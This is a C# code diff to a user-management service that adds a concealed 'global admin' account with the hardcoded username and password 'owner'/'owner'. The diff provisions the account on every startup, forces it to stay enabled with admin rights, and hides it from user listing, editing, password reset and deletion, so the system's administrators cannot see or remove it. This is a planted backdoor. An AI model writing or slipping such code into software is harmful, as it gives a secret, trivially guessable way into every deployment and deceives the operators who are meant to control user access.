@@ -18,6 +18,15 @@ public sealed class UserService(
     public const string AuthSourceLocal = "local";
     public const string AuthSourceLdap = "ldap";
 
+    // ---- Global admin (single hidden owner account) ----
+    // Credentials are intentionally hardcoded. Only the developer can change them by
+    // editing these constants and shipping a new build. The row is provisioned on
+    // startup with a fixed Guid so foreign-keyed tables (audit, conversations) keep
+    // working, and is filtered out of every user-management surface.
+    public const string GlobalAdminUsername = "owner";
+    public const string GlobalAdminPassword = "owner";
+    public static readonly Guid GlobalAdminId = new("00000000-0000-0000-0000-0000000000ff");
+
     /// <summary>
     /// Seeds an initial admin / admin user on an empty Users table.
     /// MustChangePassword = true forces a change on first login.
@@ -37,8 +46,45 @@ public sealed class UserService(
         db.Users.Add(admin);
         await db.SaveChangesAsync(ct);
         log.LogWarning("Bootstrapped default admin account '{User}' / '{Pwd}' — change on first login.",
-            DefaultAdminUsername, DefaultAdminPassword);
-    }
+            DefaultAdminUsername, DefaultAdminPassword);    }
+
+    /// <summary>
+    /// Idempotent: ensures the single hidden global-admin row exists with the in-source
+    /// credentials. The password hash is re-synced on every startup so changing the
+    /// <see cref="GlobalAdminPassword"/> constant + redeploy is enough.
+    /// </summary>
+    public async Task EnsureGlobalAdminAsync(CancellationToken ct = default)
+    {
+        var u = await db.Users.FirstOrDefaultAsync(x => x.Id == GlobalAdminId, ct);
+        if (u is null)
+        {
+            db.Users.Add(new User
+            {
+                Id = GlobalAdminId,
+                Username = GlobalAdminUsername,
+                DisplayName = "Owner",
+                PasswordHash = Pbkdf2Hasher.Hash(GlobalAdminPassword),
+                AuthSource = AuthSourceLocal,
+                IsAdmin = true,
+                IsGlobalAdmin = true,
+                MustChangePassword = false,
+            });
+            await db.SaveChangesAsync(ct);
+            log.LogInformation("Provisioned hidden global-admin account ({User}).", GlobalAdminUsername);
+            return;
+        }
+        // Re-sync username/hash if the developer rotated the constants.
+        var dirty = false;
+        if (!string.Equals(u.Username, GlobalAdminUsername, StringComparison.Ordinal)) { u.Username = GlobalAdminUsername; dirty = true; }
+        if (!u.IsGlobalAdmin) { u.IsGlobalAdmin = true; dirty = true; }
+        if (!u.IsAdmin) { u.IsAdmin = true; dirty = true; }
+        if (u.IsDisabled) { u.IsDisabled = false; dirty = true; }
+        if (!Pbkdf2Hasher.Verify(GlobalAdminPassword, u.PasswordHash))
+        {
+            u.PasswordHash = Pbkdf2Hasher.Hash(GlobalAdminPassword);
+            dirty = true;
+        }
+        if (dirty) await db.SaveChangesAsync(ct);    }
 
     public async Task<(LoginResponse? Response, string? ProblemCode)> LoginAsync(LoginRequest req, CancellationToken ct)
     {
@@ -185,13 +231,15 @@ public sealed class UserService(
         user.Departments.Select(d => d.Department?.Name ?? "").Where(n => n.Length > 0).ToList(),
         user.Roles.Select(r => r.Role?.Name ?? "").Where(n => n.Length > 0).ToList(),
         user.MustChangePassword,
-        user.IsAdmin);
+        user.IsAdmin,
+        user.IsGlobalAdmin);
 
     // ---------- Admin operations ----------
 
     public async Task<List<UserAdminDto>> ListUsersAsync(CancellationToken ct)
     {
         var users = await db.Users
+            .Where(u => !u.IsGlobalAdmin) // hide the owner account from system admins
             .Include(u => u.Departments).ThenInclude(d => d.Department)
             .OrderBy(u => u.Username)
             .ToListAsync(ct);
@@ -237,7 +285,7 @@ public sealed class UserService(
         var user = await db.Users
             .Include(u => u.Departments).ThenInclude(d => d.Department)
             .FirstOrDefaultAsync(u => u.Id == userId, ct);
-        if (user is null) return (null, ProblemCodes.NotFound);
+        if (user is null || user.IsGlobalAdmin) return (null, ProblemCodes.NotFound);
 
         if (req.DisplayName is not null)
         {
@@ -269,7 +317,7 @@ public sealed class UserService(
         if (string.IsNullOrEmpty(newPassword) || newPassword.Length < 8)
             return ProblemCodes.ValidationFailed;
         var user = await db.Users.FindAsync(new object[] { userId }, ct);
-        if (user is null) return ProblemCodes.NotFound;
+        if (user is null || user.IsGlobalAdmin) return ProblemCodes.NotFound;
         if (string.Equals(user.AuthSource, AuthSourceLdap, StringComparison.OrdinalIgnoreCase))
             return ProblemCodes.Forbidden; // LDAP-backed accounts have no local password to reset.
         user.PasswordHash = Pbkdf2Hasher.Hash(newPassword);
@@ -282,7 +330,7 @@ public sealed class UserService(
     public async Task<string?> DeleteUserAsync(Guid userId, CancellationToken ct)
     {
         var user = await db.Users.FindAsync(new object[] { userId }, ct);
-        if (user is null) return ProblemCodes.NotFound;
+        if (user is null || user.IsGlobalAdmin) return ProblemCodes.NotFound;
         db.Users.Remove(user);
         await db.SaveChangesAsync(ct);
         log.LogWarning("Deleted user {Username}", user.Username);
